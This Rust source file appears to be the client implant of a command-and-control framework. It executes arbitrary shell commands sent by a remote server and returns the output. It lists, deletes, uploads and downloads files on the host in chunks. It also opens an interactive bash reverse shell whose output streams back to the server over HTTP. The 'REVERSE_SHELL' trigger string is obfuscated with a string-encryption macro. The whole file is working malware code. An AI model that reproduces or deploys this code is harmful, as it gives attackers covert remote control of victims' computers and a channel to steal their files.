use cryptify::encrypt_string;
use log::info;
use reqwest::Client;
use std::path::PathBuf;
use std::process::Stdio;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;

use crate::file_manager::ClientFileManager;
use common::error::{C2Error, C2Result};
use common::message::{
    CommandRequest,
    CommandResponse,
    DeletePathRequest,
    DeletePathResponse,
    DownloadFileRequest,
    FileChunk,
    ListDirRequest,
    ListDirResponse,
    Message,
    MessageType,
    ShellData,
    UploadFileRequest, // UploadFileRequest is now used
};

pub async fn execute_command(
    http_client: &Client,
    server_url: &str,
    client_id: &str,
    cmd: CommandRequest,
    file_manager: &ClientFileManager,
) -> C2Result<()> {
    info!("Executing command: {}", cmd.command); // Changed println to info!

    if cmd.command == encrypt_string!("REVERSE_SHELL") {
        if let Some(session_id) = cmd.args.first() {
            return start_reverse_shell(http_client, server_url, session_id.clone().to_string())
                .await;
        } else {
            return Err(C2Error::Other(
                "Reverse shell command missing session_id".into(),
            ));
        }
    }

    match cmd.command.as_str() {
        "LIST_DIR" => {
            let req: ListDirRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
            let result =
                ClientFileManager::list_directory(&PathBuf::from(req.path), req.recursive).await;
            let response = match result {
                Ok(entries) => ListDirResponse {
                    entries,
                    success: true,
                    message: "Directory listed successfully.".to_string(),
                },
                Err(e) => ListDirResponse {
                    entries: Vec::new(),
                    success: false,
                    message: format!("Failed to list directory: {}", e),
                },
            };
            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                MessageType::ListDir,
                serde_json::to_vec(&response)?,
            )
            .await?;
        }
        "DELETE_PATH" => {
            let req: DeletePathRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
            let result = ClientFileManager::delete_path(&PathBuf::from(req.path)).await;
            let response = match result {
                Ok(_) => DeletePathResponse {
                    success: true,
                    message: "Path deleted successfully.".to_string(),
                },
                Err(e) => DeletePathResponse {
                    success: false,
                    message: format!("Failed to delete path: {}", e),
                },
            };
            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                MessageType::DeletePath,
                serde_json::to_vec(&response)?,
            )
            .await?;
        }
        "DOWNLOAD_FILE_INIT" => {
            let req: DownloadFileRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
            let result = file_manager
                .initiate_download(&PathBuf::from(req.path))
                .await;
            let response_payload = match result {
                Ok(file_id) => serde_json::to_vec(
                    &serde_json::json!({"file_id": file_id, "success": true, "message": "Download initiated."}),
                )?,
                Err(e) => serde_json::to_vec(
                    &serde_json::json!({"success": false, "message": format!("Failed to initiate download: {}", e)}),
                )?,
            };
            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                MessageType::DownloadFile,
                response_payload,
            )
            .await?;
        }
        "DOWNLOAD_FILE_CHUNK" => {
            let file_id = &cmd.args[0];
            let result = file_manager.get_next_download_chunk(file_id).await;
            let response_payload = match result {
                Ok(Some(chunk)) => serde_json::to_vec(&chunk)?,
                Ok(None) => serde_json::to_vec(
                    &serde_json::json!({"is_last": true, "message": "Download complete."}),
                )?,
                Err(e) => serde_json::to_vec(
                    &serde_json::json!({"success": false, "message": format!("Failed to get download chunk: {}", e)}),
                )?,
            };
            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                MessageType::DownloadFile,
                response_payload,
            )
            .await?;
        }
        "UPLOAD_FILE_INIT" => {
            // New: Handle upload initiation
            let req: UploadFileRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
            let result = file_manager
                .initiate_upload(&PathBuf::from(req.path), &req.file_id)
                .await;
            let response_payload = match result {
                Ok(_) => serde_json::to_vec(
                    &serde_json::json!({"success": true, "message": "Upload initiated."}),
                )?,
                Err(e) => serde_json::to_vec(
                    &serde_json::json!({"success": false, "message": format!("Failed to initiate upload: {}", e)}),
                )?,
            };
            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                MessageType::UploadFile,
                response_payload,
            )
            .await?;
        }
        "UPLOAD_FILE_CHUNK" => {
            // Modified: Handle subsequent chunks
            let chunk: FileChunk = serde_json::from_slice(&cmd.args[0].as_bytes())?;
            let result = file_manager
                .write_file_chunk(&chunk.file_id.clone(), chunk)
                .await; // Clone file_id
            let response_payload = match result {
                Ok(_) => serde_json::to_vec(
                    &serde_json::json!({"success": true, "message": "Chunk uploaded."}),
                )?,
                Err(e) => serde_json::to_vec(
                    &serde_json::json!({"success": false, "message": format!("Failed to upload chunk: {}", e)}),
                )?,
            };
            send_file_operation_response(
                http_client,
                server_url,
                client_id,
                MessageType::UploadFile,
                response_payload,
            )
            .await?;
        }
        _ => {
            // Original command execution logic
            let output = Command::new("sh")
                .arg("-c")
                .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
                .output()
                .await?;

            let result = CommandResponse {
                client_id: client_id.to_string(),
                command: cmd.command.clone(),
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                exit_code: output.status.code().unwrap_or(-1),
                executed_at: chrono::Utc::now(),
            };

            send_command_result(http_client, server_url, result).await?;
        }
    }
    Ok(())
}

async fn send_command_result(
    http_client: &Client,
    server_url: &str,
    result: CommandResponse,
) -> C2Result<()> {
    let payload = serde_json::to_vec(&result)?;
    let message = Message::new(MessageType::CommandResult, payload);

    http_client
        .post(format!("{server_url}/api/command_result"))
        .json(&message)
        .send()
        .await?;
    Ok(())
}

async fn send_file_operation_response(
    http_client: &Client,
    server_url: &str,
    client_id: &str,
    original_message_type: MessageType,
    payload: Vec<u8>,
) -> C2Result<()> {
    info!(
        "Sending file operation response for client {} with type {:?}",
        client_id, original_message_type
    );
    let message = Message::new(MessageType::FileOperationResponse, payload);

    http_client
        .post(format!(
            "{server_url}/api/file_operation_response/{}",
            client_id
        ))
        .json(&message)
        .send()
        .await?;
    Ok(())
}

async fn start_reverse_shell(
    http_client: &Client,
    server_url: &str,
    session_id: String,
) -> C2Result<()> {
    println!("Starting reverse shell for session {session_id}...");
    let mut shell_process = Command::new("/bin/bash")
        .arg("-i")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdout = shell_process
        .stdout
        .take()
        .ok_or(C2Error::Other("Failed to get stdout".into()))?;

    let http_client_clone = http_client.clone();
    let server_url_clone = server_url.to_string();

    tokio::spawn(async move {
        let mut reader = BufReader::new(stdout);
        loop {
            let mut buf = Vec::new();
            match reader.read_until(b'\n', &mut buf).await {
                Ok(0) => break, // EOF
                Ok(_) => {
                    let shell_data = ShellData::new(session_id.clone(), buf);
                    let payload = serde_json::to_vec(&shell_data).unwrap();
                    let message = Message::new(MessageType::ShellData, payload);

                    if let Err(e) = http_client_clone
                        .post(format!("{server_url_clone}/api/shell_data"))
                        .json(&message)
                        .send()
                        .await
                    {
                        eprintln!("Failed to send shell data: {e}");
                    }
                }
                Err(e) => {
                    eprintln!("Error reading from shell stdout: {e}");
                    break;
                }
            }
        }
    });

    Ok(())
}
